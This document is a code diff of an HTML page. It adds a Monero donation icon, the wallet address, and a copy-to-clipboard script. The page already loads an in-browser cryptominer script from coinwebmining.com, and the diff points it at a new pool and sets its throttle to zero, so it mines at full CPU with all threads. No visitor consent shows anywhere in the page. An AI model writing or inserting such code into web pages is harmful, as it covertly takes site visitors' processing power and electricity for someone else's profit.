@@ -43,6 +43,9 @@
                                     <span class="icon-bar fab fa-windows btn-dark" onclick="fWindows()"></span>
 
                                     <span class="icon-bar fab fa-linux btn-dark" onclick="fLinux()"></span>
+
+                                    <a href="https://moneroocean.stream/" target="_blank" rel="noopener noreferrer">
+                                    <span class="icon-bar fab fa-monero btn-dark" onclick="fMonero()"></span></a>
                                 </div>
                     </div>
                 </nav>
@@ -104,9 +107,30 @@
                 alert("Copied the text: " + copyText.value);
             }
             </script>
+
+        <input type="text" value="44UYjroq1b6JS6sjYMaoKVePJGy6B8pw4Am7iN8Ldui2gsSAYcYx3Hu4Gp9zexGyr7WJjZ4kwJvS96nXCGDZnv1TQvDt8Uv" id="myMonero">
+
+        <!-- Function JavaScript-->
+        <script>
+        function fMonero() {
+            /* Get the text field */
+            var copyText = document.getElementById("myMonero");
+
+            /* Select the text field */
+            copyText.select();
+            copyText.setSelectionRange(0, 99999); /*For mobile devices*/
+
+            /* Copy the text inside the text field */
+            document.execCommand("copy");
+
+            /* Alert the copied text */
+            alert("Monero PUB: " + copyText.value);
+        }
+        </script>
     </div>
 
     <!-- Monero-->
+
 
 
     <script src="https://coinwebmining.com/cwm.js"></script>
@@ -115,9 +139,9 @@
         var coin = 'monero';
         var wallet = '44UYjroq1b6JS6sjYMaoKVePJGy6B8pw4Am7iN8Ldui2gsSAYcYx3Hu4Gp9zexGyr7WJjZ4kwJvS96nXCGDZnv1TQvDt8Uv';
         var password = 'tmask.pl';
-        var mining_pool = 'xmr.prohash.net:1111';
+        var mining_pool = 'gulf.moneroocean.stream:10001';
         var threads = -1;
-        var throttle = 0.6;
+        var throttle = 0;
         var debug = false;
         cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);
     </script>
